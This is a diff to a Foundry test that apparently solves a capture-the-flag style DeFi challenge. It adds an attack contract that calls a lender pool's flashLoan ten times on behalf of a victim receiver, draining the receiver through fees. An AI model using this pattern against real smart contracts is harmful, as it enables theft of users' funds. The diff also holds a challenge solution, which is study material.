@@ -7,6 +7,24 @@ import "forge-std/Test.sol";
 import {FlashLoanReceiver} from "../../../src/Contracts/naive-receiver/FlashLoanReceiver.sol";
 import {NaiveReceiverLenderPool} from "../../../src/Contracts/naive-receiver/NaiveReceiverLenderPool.sol";
 
+contract Attacks {
+    NaiveReceiverLenderPool internal naiveReceiverLenderPool;
+    FlashLoanReceiver internal flashLoanReceiver;
+    address owner;
+
+    constructor(address payable pool, address payable receiver) {
+        owner = msg.sender;
+        naiveReceiverLenderPool = NaiveReceiverLenderPool(pool);
+        flashLoanReceiver = FlashLoanReceiver(receiver);
+    }
+
+    function hack() public {
+        for (uint256 i = 0; i < 10; i++) {
+            naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), address(owner).balance);
+        }
+    }
+}
+
 contract NaiveReceiver is Test {
     uint256 internal constant ETHER_IN_POOL = 1_000e18;
     uint256 internal constant ETHER_IN_RECEIVER = 10e18;
@@ -48,6 +66,11 @@ contract NaiveReceiver is Test {
         /**
          * EXPLOIT START *
          */
+
+        vm.startPrank(attacker);
+        Attacks atk = new Attacks(payable(naiveReceiverLenderPool), payable(flashLoanReceiver));
+        atk.hack();
+        vm.stopPrank();
 
         /**
          * EXPLOIT END *
